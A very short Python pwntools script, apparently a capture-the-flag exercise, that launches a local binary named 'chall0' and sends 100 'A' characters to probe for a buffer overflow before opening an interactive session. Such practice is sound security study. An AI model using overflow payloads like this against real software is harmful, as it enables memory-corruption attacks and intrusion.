#!/usr/bin/python3

from pwn import * 

p = process("./chall0")

offset = 100
paylaod = 'A'*offset 

p.sendline(paylaod)
p.interactive()